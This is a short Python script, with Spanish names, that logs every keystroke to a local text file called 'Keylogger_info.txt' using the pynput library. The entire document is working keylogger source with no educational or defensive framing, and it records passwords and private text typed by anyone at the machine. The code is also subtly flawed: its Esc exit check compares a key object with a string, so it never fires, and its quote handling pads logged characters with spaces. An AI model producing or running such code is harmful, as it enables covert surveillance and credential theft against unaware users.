from pynput.keyboard import Listener

archivo_registro = "Keylogger_info.txt"

def registrar_tecla(tecla):
    tecla = str(tecla).replace("'", " ")

    with open(archivo_registro, "a") as archivo:
        if tecla == "Key.space":
            archivo.write(" ")
        elif tecla == "Key.enter":
            archivo.write("\n")
        elif tecla == "Key.backspace":
            archivo.write("<BORRAR>")
        else:
            archivo.write(tecla)

def salir(tecla):
    if tecla == "Key.esc":
        return False
    
with Listener(on_press=registrar_tecla, on_release=salir) as listener:
    listener.join()